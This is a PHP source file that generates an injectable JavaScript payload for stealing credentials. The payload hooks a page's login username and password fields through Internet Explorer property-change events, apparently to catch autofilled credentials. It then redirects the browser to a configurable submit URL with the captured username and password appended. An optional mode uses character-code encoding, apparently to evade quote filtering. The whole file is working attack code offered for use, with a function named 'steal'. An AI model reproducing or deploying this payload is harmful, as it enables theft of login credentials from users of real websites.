<?php
    // See the following site for more information: http://www.equilibrioinestable.com/ie8/
    $result = "<script>";
      $result .= "var uL=0;";
      $result .= "var uPM=0;";
      
      if(isset($quotes))
      {
        $result .= "var oc=String.fromCharCode(111,110,99,108,105,99,107);"; //OnClick
        $result .= "var op=String.fromCharCode(111,110,112,114,111,112,101,114,116,121,99,104,97,110,103,101);"; // OnPropertyChange
      } 
           
      $result .= "function cFU(){"; // Check first use
        $result .= "if((uL+1 != u.value.length) && uPM==0)";
          $result .= " uPM=1;";
        $result .= "else";
          $result .= " uL++;";
      $result .= "}";
      
      $result .= "function steal(){";
        $result .= "if(uPM==1){";
          if(isset($quotes))
          {
            $result .= "window.location=String.fromCharCode(".toCharArray($submitURL."?u=").")+u.value";
            $result .= "+String.fromCharCode(".toCharArray("&p=").")+p.value;";
          }
          else
          {
            $result .= "window.location=\"". $submitURL ."?u=\"+u.value+\"&p=\"+p.value;";
          }
          $result .= "p.detachEvent(";
          
          if(isset($quotes))
            $result .= "op";
          else
            $result .= "'onpropertychange'";
          
          $result .= ",steal);";
        $result .= "}";
      $result .= "}";
      
      $result .= "function uIWHP(){"; // user Is Writing His Password
        $result .= "u.detachEvent(";
        
        if(isset($quotes))
          $result .= "op";
        else
          $result .= "'onpropertychange'";
          
        $result .= ",cFU);";
      $result .= "}";
      $result .= "var u=document.login.".$usernameField.";";
      $result .= "var p=document.login.".$passwordField.";";
      $result .= "p.attachEvent(";
      
      if(isset($quotes))
        $result .= "op";
      else
        $result .= "'onpropertychange'";
      
      $result .= ",steal);";
      $result .= "u.attachEvent(";
      
      if(isset($quotes))
        $result .= "op";
      else
        $result .= "'onpropertychange'";     
      
      $result .= ",cFU);";
      $result .= "p.attachEvent(";
      
      if(isset($quotes))
        $result .= "oc";
      else
        $result .= "'onClick'"; 
      
      $result .= ",uIWHP);";
    $result .= "</script>";
?>
